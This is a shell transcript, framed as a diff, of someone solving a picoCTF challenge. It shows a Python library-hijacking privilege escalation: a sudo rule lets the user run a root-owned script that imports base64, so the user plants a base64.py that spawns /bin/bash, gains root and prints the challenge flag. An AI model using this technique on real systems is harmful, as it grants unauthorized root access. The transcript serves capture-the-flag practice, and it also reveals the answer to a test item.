@@ -1,0 +1,51 @@
+picoctf@challenge:~$ ls
+picoctf@challenge:~$ ls -la
+total 16
+drwxr-xr-x 1 picoctf picoctf   20 Mar 26 18:57 .
+drwxr-xr-x 1 root    root      21 Aug  4  2023 ..
+-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
+drwx------ 2 picoctf picoctf   34 Mar 26 18:57 .cache
+-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
+-rw-r--r-- 1 root    root     375 Feb  7  2024 .server.py
+picoctf@challenge:~$ sudo -l
+Matching Defaults entries for picoctf on challenge:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User picoctf may run the following commands on challenge:
+    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
+picoctf@challenge:~$ cat /home/picoctf/.server.py
+import base64
+import os
+import socket
+ip = 'picoctf.org'
+response = os.system("ping -c 1 " + ip)
+#saving ping details to a variable
+host_info = socket.gethostbyaddr(ip) 
+#getting IP from a domaine
+host_info_to_str = str(host_info[2])
+host_info = base64.b64encode(host_info_to_str.encode('ascii'))
+print("Hello, this is a part of information gathering",'Host: ', host_info)  
+picoctf@challenge:~$ echo 'import os; os.system("/bin/bash")' > base64.py
+picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
+root@challenge:/home/picoctf# cat /root/flag.txt
+cat: /root/flag.txt: No such file or directory
+root@challenge:/home/picoctf# ls
+__pycache__  base64.py
+root@challenge:/home/picoctf# find / -name "*flag*" 2>/dev/null
+/proc/sys/kernel/acpi_video_flags
+/proc/sys/net/ipv4/fib_notify_on_flag_change
+/proc/sys/net/ipv6/fib_notify_on_flag_change
+/proc/kpageflags
+/root/.flag.txt
+/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
+/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
+/sys/devices/virtual/net/lo/flags
+/sys/devices/virtual/net/eth0/flags
+/sys/module/scsi_mod/parameters/default_dev_flags
+root@challenge:/home/picoctf# cat /root/.flag.txt
+picoCTF{pYth0nn_libraryH!j@CK!n9_0083cb0b}
+root@challenge:/home/picoctf# Connection to saturn.picoctf.net closed by remote host.
+Connection to saturn.picoctf.net closed.
